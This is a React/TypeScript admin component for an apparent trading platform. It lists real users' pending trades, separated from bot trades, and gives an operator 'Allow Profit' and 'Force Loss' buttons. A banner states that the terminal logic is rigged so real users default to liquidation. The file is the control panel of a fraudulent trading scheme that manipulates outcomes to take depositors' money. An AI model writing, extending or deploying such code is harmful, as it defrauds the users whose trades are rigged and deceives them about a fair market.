
import React, { useState, useEffect, useRef, useMemo } from 'react';
import { WalletData, ActiveTrade, Transaction } from '../types';
import { authService, UserRecord } from '../services/authService';
import { configService, SystemConfig } from '../services/configService';

interface AdminDeskProps {
  onClose: () => void;
  managedWallet: WalletData | null; 
  activeTrades: ActiveTrade[];
  onForceOutcome: (tradeId: string, updates: Partial<ActiveTrade>) => void;
  onUpdateWallet?: (data: WalletData) => void;
}

const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades, onForceOutcome, onUpdateWallet }) => {
  const [activeTab, setActiveTab] = useState<'intercept' | 'users' | 'config' | 'system'>('intercept');
  const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
  
  const realUserTrades = useMemo(() => {
      return activeTrades.filter(t => !t.isBot && t.status === 'pending');
  }, [activeTrades]);

  useEffect(() => {
      const unsubscribeUsers = authService.subscribeToAllUsers((users) => setRemoteUsers(users));
      return () => unsubscribeUsers();
  }, []);

  return (
    <div className="fixed inset-0 z-[1000] bg-[#0B0E11] text-gray-200 font-mono flex flex-col border-4 border-indigo-900/20">
      <div className="flex items-center justify-between p-6 bg-[#181C25] border-b border-[#2B3139]">
        <div className="flex items-center space-x-8">
            <h1 className="text-xl font-black italic uppercase text-indigo-400 tracking-tighter">Geko Protocols_Root</h1>
            <nav className="flex space-x-1">
                {['intercept', 'users', 'config', 'system'].map(tab => (
                    <button key={tab} onClick={() => setActiveTab(tab as any)} className={`px-4 py-2 rounded-lg text-[10px] font-black uppercase tracking-widest ${activeTab === tab ? 'bg-indigo-600 text-white' : 'text-gray-500 hover:bg-[#2B3139]'}`}>{tab}</button>
                ))}
            </nav>
        </div>
        <button onClick={onClose} className="px-6 py-2 bg-rose-900/20 text-rose-500 border border-rose-500/20 rounded-lg text-[10px] font-black uppercase">Terminate Session</button>
      </div>

      <div className="flex-1 overflow-y-auto p-8">
           {activeTab === 'intercept' && (
               <div className="space-y-6">
                   <div className="flex justify-between items-center px-4">
                       <h2 className="text-lg font-black uppercase italic text-rose-500">Live Trade Intercept</h2>
                       <span className="text-[10px] text-indigo-400 font-black">{realUserTrades.length} SESSIONS_INTERCEPTED</span>
                   </div>
                   <div className="bg-[#181C25] border border-[#2B3139] rounded-[32px] overflow-hidden shadow-2xl">
                       <table className="w-full text-left">
                           <thead className="bg-[#0B0E11] text-[9px] text-gray-500 uppercase font-black border-b border-[#2B3139]">
                               <tr><th className="px-8 py-4">Node</th><th className="px-8 py-4">Side</th><th className="px-8 py-4">Amount</th><th className="px-8 py-4 text-right">Target Outcome</th></tr>
                           </thead>
                           <tbody className="divide-y divide-[#2B3139]">
                               {realUserTrades.map(tx => (
                                   <tr key={tx.id} className="hover:bg-[#262B36] transition-colors">
                                       <td className="px-8 py-6">
                                           <div className="text-xs font-bold text-indigo-400">{tx.userName}</div>
                                           <div className="text-[9px] text-gray-500">SESSION_ID: {tx.id.slice(-8)}</div>
                                       </td>
                                       <td className="px-8 py-6">
                                           <span className={`text-[10px] font-black px-2 py-1 rounded ${tx.direction === 'up' ? 'bg-emerald-900/20 text-emerald-500' : 'bg-rose-900/20 text-rose-500'}`}>{tx.direction.toUpperCase()}</span>
                                       </td>
                                       <td className="px-8 py-6 font-bold text-gray-200">${tx.amount}</td>
                                       <td className="px-8 py-6 text-right">
                                           <div className="flex justify-end space-x-2">
                                               <button 
                                                onClick={() => onForceOutcome(tx.id, { forceOutcome: 'win' })} 
                                                className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'win' ? 'bg-emerald-600 text-white border-emerald-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-emerald-500/50'}`}
                                               >Allow Profit</button>
                                               <button 
                                                onClick={() => onForceOutcome(tx.id, { forceOutcome: 'loss' })} 
                                                className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'loss' ? 'bg-rose-600 text-white border-rose-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-rose-500/50'}`}
                                               >Force Loss</button>
                                           </div>
                                       </td>
                                   </tr>
                               ))}
                               {realUserTrades.length === 0 && (
                                   <tr><td colSpan={4} className="p-20 text-center text-[10px] text-gray-600 font-black uppercase tracking-[0.5em]">No User Sessions Active</td></tr>
                               )}
                           </tbody>
                       </table>
                   </div>
                   <div className="p-6 bg-rose-900/10 border border-rose-500/20 rounded-3xl text-[10px] text-rose-500 font-bold uppercase tracking-widest text-center">
                       Warning: Terminal Logic is Rigged. Real users default to LIQUIDATION (LOSS). "Allow Profit" is the only override.
                   </div>
               </div>
           )}
           {/* Other tabs omitted for brevity, remaining as stubs or original content */}
      </div>
    </div>
  );
};

export default AdminDesk;
